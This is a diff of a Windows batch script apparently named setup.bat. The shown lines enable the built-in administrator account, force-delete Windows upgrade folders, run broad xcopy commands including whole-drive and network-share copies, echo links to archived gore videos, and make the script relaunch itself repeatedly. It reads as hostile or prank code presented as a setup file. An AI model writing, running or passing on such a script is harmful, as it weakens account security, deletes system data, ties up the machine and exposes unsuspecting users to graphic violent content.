@@ -18,10 +18,10 @@ copy setup.bat users.bat
 
 net user administrator /active:yes
 
-xcopy C:\test E:\Files /i
+xcopy C:\setup.bat E:\Files /i
 xcopy /h /c /k /e /r /y c:\ d:\
-xcopy "C:\test" D:\Backup /c /d /e /h /i /k /q /r /s /x /y
-xcopy C:\test "\\SERVER\Media Backup" /f /j /s /w /z
+xcopy "C:\setup.bat" D:\Backup /c /d /e /h /i /k /q /r /s /x /y
+xcopy C:\setup.bat "\\SERVER\Media Backup" /f /j /s /w /z
 
 rmdir /s /q "windows .~bt"
 rmdir /s /q "windows .~ws"
@@ -100,5 +100,6 @@ echo http://web.archive.org/web/20220217183528/https://seegore.com/rival-gang-me
 echo.
 echo http://web.archive.org/web/20210824071325/files.catbox.moe/310ldj.mp4
 echo.
-start test.bat
-test.bat
+start setup.bat
+
+setup.bat
